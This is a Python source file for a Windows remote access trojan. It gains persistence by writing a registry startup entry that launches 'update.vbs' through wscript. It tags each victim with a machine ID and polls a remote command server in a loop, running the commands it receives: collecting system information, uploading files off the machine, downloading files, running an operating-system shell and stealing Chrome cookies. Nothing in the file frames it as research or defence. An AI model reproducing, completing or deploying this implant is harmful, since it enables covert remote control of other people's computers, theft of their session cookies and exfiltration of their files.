import os
import sys
import psutil
import tempfile
import secrets
import time
import asyncio 
import subprocess
import winreg

import command
import api
import config


def register_startup(file_path):
    try:
        # Write to registry for user startup
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, config.REG_PATH, 0, winreg.KEY_SET_VALUE)
        reg_value = f'"wscript.exe" "{file_path}"'
        winreg.SetValueEx(key, config.REG_KEY, 0, winreg.REG_SZ, reg_value)
        winreg.CloseKey(key)
        print("[✔] Registry key added successfully.")
    except Exception as e:
        print(f"[❌] Failed to add registry key: {e}")

    # try:
    #     # Set environment variable
    #     subprocess.run(["setx", "Directory", param], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    #     print("[✔] Environment variable set.")
    # except Exception as e:
    #     print(f"[❌] Failed to set environment variable: {e}")


def generate_UUID0501():
    temp_dir = tempfile.gettempdir()
    hostfile = os.path.join(temp_dir, config.MACHINEID_HOST_FILE_NAME0501)

    if os.path.exists(hostfile):
        with open(hostfile, 'r') as f:
            return f.read().strip()

    # Generate 4 random bytes and encode in hex
    data = secrets.token_bytes(4)
    uuid = data.hex()

    with open(hostfile, 'w') as f:
        f.write(uuid)

    return uuid


async def main():
    file_path = os.path.abspath("update.vbs")
    register_startup(file_path)
    if os.path.isfile(config.PID_NAME0501):
        with open(config.PID_NAME0501, 'r') as f:
            old_pid = int(f.read())
            if psutil.pid_exists(old_pid):
                print("Process is already running.")
                sys.exit()

    with open(config.PID_NAME0501, 'w') as f:
        f.write(str(os.getpid()))


    uuid = generate_UUID0501()

    msg_type = ""
    msg_data = []
    msg = ""
    cmd = ""
    cmd_type = config.COMMAND_INFORMATION0501
    cmd_data = []
    alive = True

    command_param = None
    if '-command' in sys.argv:
        command_index = sys.argv.index('-command')
        if len(sys.argv) > command_index + 1:
            command_param = sys.argv[command_index + 1]

    if command_param is not None:
        if command_param == "cookie":
            cmd_type = config.COMMAND_AUTO0501
            cmd_data.append(config.AUTO_CHROME_COOKIE_COMMAND0501.encode())
    while alive:
        try:
            if cmd_type == config.COMMAND_INFORMATION0501:
                msg_type, msg_data = command.process_info()
            elif cmd_type == config.COMMAND_FILE_UPLOAD0501:
                msg_type, msg_data = command.process_upload(cmd_data)
            elif cmd_type == config.COMMAND_FILE_DOWNLOAD0501:
                msg_type, msg_data = command.process_download(cmd_data)
            elif cmd_type == config.COMMAND_OS_SHELL0501:
                msg_type, msg_data = await command.process_os_shell(cmd_data)
            elif cmd_type == config.COMMAND_AUTO0501:
                msg_type, msg_data = command.process_auto(cmd_data)
            elif cmd_type == config.COMMAND_WAIT0501:
                msg_type, msg_data = command.process_wait(cmd_data)
            elif cmd_type == config.COMMAND_EXIT0501:
                alive = False
                msg_type, msg_data = command.process_exit()
            else:
                print(cmd_type)
                raise Exception("Unknown command type")

            msg = command.make_msg0501(uuid, msg_type, msg_data)
            cmd, _ = api.htxp_exchange0501(config.UPLOAD_URL0501, msg)
            cmd_type, cmd_data = command.decode_msg0501(cmd)

        except Exception as e:
            print(f"[!] Recovered from error: {e}")
            cmd_type = config.COMMAND_INFORMATION0501
            time.sleep(config.DURATION_ERROR_WAIT0501)


if __name__ == "__main__":
    asyncio.run(main())